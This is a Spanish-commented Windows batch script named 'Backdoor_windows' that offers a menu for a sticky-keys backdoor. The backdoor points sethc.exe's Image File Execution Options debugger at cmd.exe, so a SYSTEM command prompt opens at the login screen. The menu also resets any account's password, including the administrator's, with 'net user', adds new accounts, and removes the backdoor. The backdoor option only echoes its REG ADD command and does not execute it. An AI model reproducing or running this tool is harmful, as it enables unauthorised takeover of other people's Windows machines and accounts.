@echo off 

rem Backdoor_windows
rem by Yeray [ YGGDEV ]
rem 31.10.18 

rem Una vez ejecutado la opcion numero 1 --crear puerta tracera -- puede reiniciar el equipo y posteriormente la tecla shift 3 veces o mayis tres veces
rem se le abrirá la consola de comandos y podra ejecuutar los comandos de la opcion  2 y 3

:inicio                                                    ";
cls 
echo "  _____ _      _     _        ____             _     ";
echo " |  __ (_)    | |   (_)      |  _ \           | |    ";
echo " | |__) |  ___| |__  _ ______| |_) | __ _  ___| |__  ";
echo " |  ___/ |/ __| '_ \| |______|  _ < / _\` |/ __| '_ \ ";
echo " | |   | | (__| | | | |      | |_) | (_| | (__| | | |";
echo " |_|   |_|\___|_| |_|_|      |____/ \__,_|\___|_| |_|";
echo "                                                     ";
echo "  
color A  
echo  1    Crear puerta tracera  
echo  2    Modificar contraseña  (Incluso administrador)
echo  3    Añadir un nuevo usuario 
echo  4    Eliminar puerta tracera
echo  5    Salir
echo ------------------------------------------------------------------------------
echo.

SET /p var= ^> Seleccione una opcion [1-5]:
if "%var%"=="0" goto inicio
if "%var%"=="1" goto op1
if "%var%"=="2" goto op2
if "%var%"=="3" goto op3
if "%var%"=="4" goto op4
if "%var%"=="5" goto salir

::Mensaje de error, validación cuando se selecciona una opción fuera de rango
echo. El numero "%var%" no es una opcion valida, por favor intente de nuevo.
echo.
pause
echo.
goto:inicio


:op1
    echo.
    
    echo.REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
       
    echo.
    pause
    goto:inicio

:op2
    clear
Net user
 echo.
echo introduce usuario a modificar  :
set /p namep=
echo introduce nueva contraseña  :
set /p contra=
       Net user %namep% %contra%
       
    echo.
    pause
    goto:inicio

:op3
    echo.
  echo introduce nuevo usuario  :
set /p namep=
echo introduce contraseña new user  :
set /p contra=
       Net user %namep% %contra% /add
      echo.
    pause
    goto:inicio


:op4
    echo.
    echo. Has elegido la opcion No. 3
    echo.

     REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
       
    echo.
    pause
    goto:inicio



:salir
    @cls&exit 
